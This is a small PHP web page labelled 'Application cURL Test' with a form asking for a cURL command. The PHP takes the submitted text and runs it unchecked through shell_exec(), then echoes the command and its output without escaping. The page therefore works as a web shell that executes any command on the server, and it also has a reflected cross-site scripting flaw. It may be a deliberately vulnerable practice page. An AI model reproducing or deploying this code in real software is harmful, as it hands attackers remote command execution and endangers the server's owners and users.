<!DOCTYPE html>

<body style="background-color: black">
	<h2 style="color: powderblue">Application cURL Test</h2>
	<div style="color: white">Enter cURL command below:</div><br>
	<form style="color: white" action="index.php" method="post">
		command: <input style="background-color: lightgrey" size="80" type="text" name="command">
		<input type="submit">
	</form>

	<?php

		$command = $_POST['command'];
		echo "<pre style='color: white'>";
		echo "<strong style='color: powderblue'>Last Command Run: <span style='color: red'>$command</span></strong>";
		echo "\r\n\n";
		echo shell_exec($command);
		echo "</pre>";

	?>
